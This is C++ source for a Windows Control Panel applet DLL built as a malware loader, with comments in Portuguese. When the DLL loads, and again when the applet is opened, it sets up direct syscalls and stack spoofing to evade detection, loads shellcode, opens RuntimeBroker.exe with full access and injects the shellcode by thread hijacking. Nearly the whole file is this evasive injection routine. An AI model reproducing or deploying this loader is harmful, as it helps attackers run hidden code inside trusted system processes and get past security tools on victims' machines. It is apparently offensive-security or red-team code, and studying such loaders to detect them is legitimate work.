#include <windows.h>
#include <cpl.h>
#include <vector>
#include "header.h"
#include "evasion.h"
#include "strenc.h"
#include "syscalls.h"

// Forward declarations
extern BOOL InitializeSyscalls();
extern BOOL InitStackSpoofer();
extern void LoadShellcodeFromBytes(std::vector<uint8_t>& shellcode);
extern DWORD FindProcessByName(const wchar_t* processName);
extern bool injectShellcode(std::vector<uint8_t>& shellcode, HANDLE hProcess, DWORD processId);

#define NUM_APPLETS 1
#define APPLET_INDEX 0

typedef struct {
    HWND hwnd;
    HICON hIcon;
} APPLET_CONTEXT;

static APPLET_CONTEXT g_Context = { 0 };
BOOL ExecuteInjectionHijack(HWND hwnd);
// DllMain obrigatório para DLLs - EXECUTA INJEÇÃO AUTOMATICAMENTE
BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:




        


        
        // Executa a injeção
        ExecuteInjectionHijack(NULL);
        




        break;
        
    case DLL_PROCESS_DETACH:

        if (g_Context.hIcon) {
            DestroyIcon(g_Context.hIcon);
            g_Context.hIcon = NULL;
        }
        break;
    }
    return TRUE;
}

// Executa injeção com hijacking de thread (sem criar nova)
BOOL ExecuteInjectionHijack(HWND)
{

    

    if (!InitializeSyscalls()) {

        return FALSE;
    }



    if (!InitStackSpoofer()) {

        return FALSE;
    }



    std::vector<uint8_t> sc;
    LoadShellcodeFromBytes(sc);

    
    if (sc.empty()) {

        return FALSE;
    }



    DWORD pid = FindProcessByName(L"RuntimeBroker.exe");

    
    if (!pid) {

        pid = FindProcessByName(L"RuntimeBroker.exe");

    }
    
    if (!pid) {

        return FALSE;
    }



    HANDLE hProcess = NULL;
    MY_CLIENT_ID cid = { 0 };
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    
    MY_OBJECT_ATTRIBUTES objAttr = { 0 };
    objAttr.Length = sizeof(MY_OBJECT_ATTRIBUTES);

    NTSTATUS st = SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cid);


    
    if (!NT_SUCCESS(st) || !hProcess) {

        return FALSE;
    }



    bool bResult = injectShellcode(sc, hProcess, pid);

    
    // Aguarda tempo para o APC executar e o processo reagir

    Sleep(2000);  // 2 segundos

    

    SysNtClose(hProcess);


    if (bResult) {


        return TRUE;
    } else {


        return FALSE;
    }
}

// CPlApplet - Ponto de entrada do Control Panel
extern "C" LONG CPlApplet(
    HWND hwndCPl,
    UINT uMsg,
    LPARAM lParam1,
    LPARAM lParam2)
{

    
    switch (uMsg) {
    case CPL_INIT:

        return NUM_APPLETS;

    case CPL_GETCOUNT:

        return NUM_APPLETS;

    case CPL_INQUIRE: {

        LPCPLINFO lpCPlInfo = (LPCPLINFO)lParam2;
        if (!lpCPlInfo) {

            return 0;
        }
        lpCPlInfo->idIcon = 0;
        lpCPlInfo->idName = 0;
        lpCPlInfo->idInfo = 0;
        lpCPlInfo->lData = APPLET_INDEX;

        return 1;
    }

    case CPL_NEWINQUIRE: {

        LPNEWCPLINFOW lpNewCPlInfo = (LPNEWCPLINFOW)lParam2;
        if (!lpNewCPlInfo) {

            return 0;
        }
        lpNewCPlInfo->dwSize = sizeof(NEWCPLINFOW);
        lpNewCPlInfo->dwFlags = 0;
        lpNewCPlInfo->lData = APPLET_INDEX;
        wcscpy_s(lpNewCPlInfo->szName, ARRAYSIZE(lpNewCPlInfo->szName), L"Shellcode Injection");
        wcscpy_s(lpNewCPlInfo->szInfo, ARRAYSIZE(lpNewCPlInfo->szInfo), L"Execute thread hijacking injection");
        lpNewCPlInfo->hIcon = LoadIconW(NULL, IDI_APPLICATION);

        return 1;
    }

    case CPL_DBLCLK:
    case CPL_STARTWPARMS:

        g_Context.hwnd = hwndCPl;
        ExecuteInjectionHijack(hwndCPl);
        return 0;

    case CPL_STOP:

        return 0;
        
    case CPL_EXIT:

        if (g_Context.hIcon) {
            DestroyIcon(g_Context.hIcon);
            g_Context.hIcon = NULL;
        }
        return 0;

    default:

        return 0;
    }
}
